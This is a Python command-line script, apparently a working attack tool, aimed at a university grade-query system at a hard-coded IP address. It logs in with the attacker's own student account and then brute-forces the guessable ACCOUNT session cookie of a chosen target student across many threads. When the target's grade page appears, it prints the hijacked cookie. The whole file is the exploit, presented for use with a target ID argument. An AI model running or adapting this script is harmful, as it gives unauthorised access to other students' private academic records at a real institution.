# encoding: utf8
from threading import Thread, Lock, Event

import requests
from argparse import ArgumentParser
import base64


class StuFuzzer(object):
    url = 'http://222.194.15.1:7777/pls/wwwbks/bks_login2.login'
    fuzz_url = 'http://222.194.15.1:7777/pls/wwwbks/bkscjcx.curscopre'
    template_data = None
    template_cookie = None
    initialized = Event()

    def __init__(self, template_id, template_pwd):
        if not self.initialized.is_set():
            StuFuzzer.template_data = {'stuid': template_id, 'pwd': template_pwd}
            while True:
                template_resp = requests.post(
                    StuFuzzer.url,
                    StuFuzzer.template_data,
                    timeout=3
                )
                if StuFuzzer.is_login(template_resp):
                    break
                else:
                    print('Login failed')
            StuFuzzer.template_cookie = template_resp.history[0].cookies
            self.initialized.set()

    class Composer:
        def __init__(self, template_account, target_id, fuzz_url, digits=4, startpos=0):
            self.cur_cookie = int(target_id + template_account[len(target_id):-digits]) * (10 ** digits) + startpos
            self.fuzz_url = fuzz_url
            self.stop = False
            self.lock = Lock()

        def __iter__(self):
            return self

        def __next__(self):
            with self.lock:
                if self.stop:
                    raise StopIteration
                req = requests.Request(
                    method='post',
                    url=self.fuzz_url,
                    headers={'Cookie': 'ACCOUNT=%s' % self.cur_cookie},
                ).prepare()
                self.cur_cookie += 1
                if self.cur_cookie % 1000 == 0:
                    print(self.cur_cookie)
                return req

    def _worker(self, composer, session=None, callback=None):
        if not session:
            session = requests.Session()
        for req in composer:
            resp = session.send(req)
            if self.checker(resp):
                composer.stop = True
                if callback is not None:
                    callback(req.headers['Cookie'])
                return req.headers['Cookie']

    def fuzz(self, target_id, threadnum=4, **composer_args):
        self.initialized.wait()
        composer = self.Composer(self.template_cookie['ACCOUNT'], target_id, self.fuzz_url, **composer_args)
        processes = [Thread(target=self._worker, kwargs={'composer': composer, 'session': requests.Session(),
                                                         'callback': lambda data: print(data)}) for i in
                     range(threadnum)]
        for i in processes:
            i.start()

    @staticmethod
    def output_result(data):
        print(data)

    @staticmethod
    def checker(response):
        return False if response is None else response.content.decode('gbk').find('td_biaogexian') > 0

    @staticmethod
    def is_login(response):
        return False if response is None else response.content.find(u'登录成功'.encode('gbk')) > 0


def main(args):
    try:
        try:
            args.login_pwd = base64.b64decode(args.login_pwd)
        except Exception:
            pass

        breaker = StuFuzzer(args.login_id, args.login_pwd)
        breaker.fuzz(
            args.target,
            args.threads,
            digits=args.digits,
            startpos=args.offset
        )
    except Exception as e:
        print("Execption '%s'" % e)


def parse_arguments():
    parser = ArgumentParser()

    parser.add_argument('target', type=str, metavar='TARGET_ID',
                        help='Target Student ID to break')
    parser.add_argument('-i', '--login_id', type=str, metavar='ID', required=True,
                        help='Student ID to login in')
    parser.add_argument('-p', '--login_pwd', type=str, metavar='PASSWORD', required=True,
                        help='Student password to login in')
    parser.add_argument('-d', '--digits', type=int, metavar='N', default=4,
                        help='Last N digits to break, default 4')
    parser.add_argument('--offset', type=int, metavar='N',
                        help='Start position offset, default 0', default=0)
    parser.add_argument('-t', '--threads', metavar='N', type=int,
                        help='Threads number, default 100', default=100)

    return parser.parse_args()


if __name__ == '__main__':
    main(parse_arguments())
